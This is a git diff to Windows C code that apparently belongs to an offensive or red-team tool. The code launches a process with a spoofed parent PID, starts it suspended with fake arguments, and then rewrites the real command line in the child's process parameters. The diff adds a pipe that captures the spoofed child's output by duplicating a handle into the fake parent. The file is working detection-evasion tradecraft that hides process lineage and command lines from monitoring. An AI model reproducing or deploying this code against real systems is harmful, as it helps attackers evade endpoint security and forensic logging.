@@ -259,10 +259,44 @@ BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVO
     return TRUE;
 }
 
-BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPCWSTR procCmdLine) {
+BOOL GetProcOutput(HANDLE g_hChildStd_OUT_Rd, PBYTE bufferSTDOUTPUT, DWORD bufferSize) {
+    DWORD dwRead;
+    BOOL bSuccess = FALSE;
+
+    bSuccess = ReadFile(g_hChildStd_OUT_Rd, bufferSTDOUTPUT, (DWORD)bufferSize-1, &dwRead, NULL);
+    if (!bSuccess || dwRead == 0) {
+        printf("[!] Failed to read from child process output pipe. Error: %u\n", GetLastError());
+        return 0;
+    }
+
+    bufferSTDOUTPUT[dwRead] = '\0'; // Null-terminate the output !
+    CloseHandle(g_hChildStd_OUT_Rd);
+    return 1;
+}
+
+HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPCWSTR procCmdLine) {
     STARTUPINFOEXW SiEx = { 0 };
     SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+
+    //Ensure that we create the process with a pipe so that we can capture the output
+    //Setting attributes for the pipe
+    // src : https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
+    SECURITY_ATTRIBUTES saAttr; 
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
+    saAttr.bInheritHandle = TRUE; 
+    saAttr.lpSecurityDescriptor = NULL; 
+
+    HANDLE g_hChildStd_OUT_Rd = NULL;
+    HANDLE g_hChildStd_OUT_Wr = NULL;
+
+    CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
+    // Ensure the read handle to the pipe for STDOUT is not inherited.
+    // So that thechild process can WR and no Rd from our process
+    if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
+        exit(1);
+
     HANDLE hHeap = GetProcessHeap();
+    PBYTE bufferSTDOUTPUT = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 10000);
 
     printf("[*] Spoofing PPID of %s\n", lpSpoofedProcPath);
     DWORD PID = 0;
@@ -278,6 +312,22 @@ BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPC
     }
 
     printf("[*] %s PID : %d\n", filename, PID);
+
+    HANDLE hDuplicatedWr = NULL; 
+    BOOL bDup = DuplicateHandle(
+        GetCurrentProcess(),     // Get handle from current process
+        g_hChildStd_OUT_Wr,      // the specific local handle
+        hParentProcess,          // into this process handle's table
+        &hDuplicatedWr,          // the handle duplicate generated
+        0,         
+        TRUE,                    // Inherit handle
+        DUPLICATE_SAME_ACCESS
+    );
+
+    //Put the duplicated handle in the attribute list for the new process
+    SiEx.StartupInfo.hStdOutput = hDuplicatedWr;
+    SiEx.StartupInfo.hStdError = hDuplicatedWr;
+    SiEx.StartupInfo.dwFlags |= STARTF_USESTDHANDLES; // Says that handles are available (our pipe)
 
     SIZE_T sThreadAttList = 0;
     PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
@@ -300,10 +350,28 @@ BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPC
     }
     fakeStartupArgs[1023] = L'\0';
 
-    if (!CreateProcessW(NULL, fakeStartupArgs, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SiEx.StartupInfo, Pi)) {
+    if (!CreateProcessW(NULL, fakeStartupArgs, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SiEx.StartupInfo, Pi)) {
         printf("[!] CreateProcessW Failed: %d\n", GetLastError());
         HeapFree(hHeap, 0, pThreadAttList);
         return FALSE;
+    }
+
+    CloseHandle(g_hChildStd_OUT_Wr); // We won't write to the child process, so we can close this end of the pipe
+
+    // Close the duplicated handle
+    HANDLE hTemp = NULL;
+    DuplicateHandle(
+        hParentProcess,          
+        hDuplicatedWr,
+        GetCurrentProcess(),
+        &hTemp,                   // Get the duplicated handle back to be able to close it locally
+        0, 
+        FALSE, 
+        DUPLICATE_CLOSE_SOURCE    // close the remote pipe handle
+    );
+
+    if (hTemp) {
+        CloseHandle(hTemp); // Et on ferme la copie qu'on vient de ramener
     }
 
     // Résolution NtQuery
@@ -348,6 +416,7 @@ BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPC
     WriteToTargetProcess(Pi->hProcess, remoteParamsBase + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength), &effectiveArgs_sz_us, sizeof(USHORT));
 
     printf("[*] Process manipulation done !\n");
+    
 
 cleanup:
 
@@ -358,5 +427,5 @@ cleanup:
         HeapFree(hHeap, 0, pThreadAttList);
     }
     
-    return TRUE;
+    return g_hChildStd_OUT_Rd;
 }
